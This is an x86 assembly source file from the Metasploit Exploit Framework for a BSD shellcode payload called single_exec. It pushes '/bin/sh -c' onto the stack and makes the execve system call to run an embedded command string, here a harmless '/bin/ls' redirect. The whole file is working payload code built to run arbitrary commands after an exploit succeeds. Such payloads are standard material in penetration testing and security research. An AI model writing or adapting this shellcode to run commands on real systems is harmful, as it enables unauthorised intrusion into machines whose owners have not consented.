;;
;
;        Name: single_exec
;   Platforms: *BSD 
;     Authors: vlad902 <vlad902 [at] gmail.com>
;     Version: $Revision$
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Execute an arbitary command.
;
;;
; NULLs are fair game.

BITS 32
global _start

_start:
  push	byte 0x3b
  pop	eax
  cdq

  push	edx
  push	word 0x632d
  mov	edi, esp

  push	edx
  push	dword 0x68732f6e
  push	dword 0x69622f2f
  mov	ebx, esp

  push	edx
  jmp	short getstr
getstr_bak:
  push	edi
  push	ebx
  mov	ecx, esp
  push	edx
  push	ecx
  push	ebx
  push	eax
  int	0x80

getstr:
  call getstr_bak
db "/bin/ls > /tmp/test_single_exec", 0x00